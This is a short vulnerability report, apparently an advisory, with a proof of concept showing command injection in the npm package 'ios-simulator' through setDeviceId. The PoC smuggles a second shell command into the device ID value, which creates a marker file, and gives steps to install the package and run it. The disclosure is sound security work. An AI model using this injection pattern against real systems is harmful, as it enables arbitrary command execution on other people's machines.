# Overview

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

1. Create the following PoC file:

```js
// poc.js

var ios = require("ios-simulator");

ios.prototype.setDeviceId('test"; touch HACKED; #');

ios.prototype.install();
```

2. Check there aren't files called `HACKED`

3. Execute the following commands in another terminal:

```bash

npm i ios-simulator # Install affected module

node poc.js #  Run the PoC

```

4. Recheck the files: now `HACKED` has been created
